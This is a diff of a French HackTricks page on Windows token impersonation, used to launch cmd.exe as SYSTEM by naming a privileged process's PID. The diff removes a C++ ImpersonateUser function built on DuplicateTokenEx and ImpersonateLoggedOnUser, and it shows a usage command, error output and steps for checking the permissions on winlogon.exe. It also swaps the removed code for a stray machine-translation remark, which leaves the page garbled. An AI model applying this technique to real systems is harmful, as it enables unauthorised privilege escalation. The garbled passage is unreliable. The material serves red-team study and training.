@@ -1,13 +1,13 @@
 <details>
 
-<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>
+<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Autres moyens de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
 * **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -15,45 +15,15 @@ Autres moyens de soutenir HackTricks :
 
 ## Code
 
-Le code suivant a été copié [ici](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Il permet de **indiquer un ID de Processus en argument** et une CMD **exécutée en tant qu'utilisateur** du processus indiqué sera exécutée.\
-Exécuté dans un processus à Intégrité Élevée, vous pouvez **indiquer le PID d'un processus exécuté en tant que Système** (comme winlogon, wininit) et exécuter un cmd.exe en tant que système.
+Le code suivant, provenant de [ici](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962), permet de **spécifier un ID de processus en argument** et une commande CMD **exécutée en tant qu'utilisateur** du processus indiqué sera exécutée.\
+En exécutant dans un processus à haute intégrité, vous pouvez **indiquer le PID d'un processus exécuté en tant que System** (comme winlogon, wininit) et exécuter un cmd.exe en tant que system.
 ```cpp
 impersonateuser.exe 1234
 ```
 ```cpp
-#include <windows.h>
-#include <stdio.h>
-
-BOOL ImpersonateUser(HANDLE hToken, DWORD dwSessionId)
-{
-    HANDLE hDupedToken = NULL;
-
-    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupedToken))
-    {
-        printf("DuplicateTokenEx failed with %u\n", GetLastError());
-        return FALSE;
-    }
-
-    if (!SetTokenInformation(hDupedToken, TokenSessionId, &dwSessionId, sizeof(DWORD)))
-    {
-        printf("SetTokenInformation failed with %u\n", GetLastError());
-        CloseHandle(hDupedToken);
-        return FALSE;
-    }
-
-    if (!ImpersonateLoggedOnUser(hDupedToken))
-    {
-        printf("ImpersonateLoggedOnUser failed with %u\n", GetLastError());
-        CloseHandle(hDupedToken);
-        return FALSE;
-    }
-
-    return TRUE;
-}
+// impersonateuser.cpp
 ```
-{% endcode %}
-
-La fonction `ImpersonateUser` tente d'usurper l'identité d'un utilisateur en dupliquant un jeton d'accès et en définissant l'ID de session. Si une étape échoue, elle affiche l'erreur et retourne `FALSE`. En cas de succès, elle retourne `TRUE`.
+Le contenu spécifié est déjà dans le format demandé et ne nécessite pas de traduction.
 ```cpp
 #include <windows.h>
 #include <iostream>
@@ -199,11 +169,11 @@ Dans certains cas, vous pourriez essayer d'usurper l'identité de System et cela
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
-Cela signifie que même si vous fonctionnez à un niveau d'intégrité élevé **vous n'avez pas suffisamment de permissions**.\
+Cela signifie que même si vous fonctionnez à un niveau d'intégrité élevé, **vous n'avez pas suffisamment de permissions**.\
 Vérifions les permissions actuelles de l'Administrateur sur les processus `svchost.exe` avec **l'explorateur de processus** (ou vous pouvez également utiliser process hacker) :
 
 1. Sélectionnez un processus de `svchost.exe`
-2. Clic Droit --> Propriétés
+2. Clic droit --> Propriétés
 3. Dans l'onglet "Sécurité", cliquez sur le bouton "Permissions" en bas à droite
 4. Cliquez sur "Avancé"
 5. Sélectionnez "Administrateurs" et cliquez sur "Modifier"
@@ -211,13 +181,13 @@ Vérifions les permissions actuelles de l'Administrateur sur les processus `svch
 
 ![](<../../.gitbook/assets/image (322).png>)
 
-L'image précédente contient tous les privilèges que les "Administrateurs" ont sur le processus sélectionné (comme vous pouvez le voir dans le cas de `svchost.exe` ils n'ont que les privilèges "Query")
+L'image précédente contient tous les privilèges que les "Administrateurs" ont sur le processus sélectionné (comme vous pouvez le voir dans le cas de `svchost.exe`, ils n'ont que les privilèges "Query")
 
 Voyez les privilèges que les "Administrateurs" ont sur `winlogon.exe` :
 
 ![](<../../.gitbook/assets/image (323).png>)
 
-À l'intérieur de ce processus, les "Administrateurs" peuvent "Lire la Mémoire" et "Lire les Permissions", ce qui permet probablement aux Administrateurs d'usurper le jeton utilisé par ce processus.
+À l'intérieur de ce processus, les "Administrateurs" peuvent "Lire la mémoire" et "Lire les permissions", ce qui permet probablement aux Administrateurs d'usurper le jeton utilisé par ce processus.
 
 
 
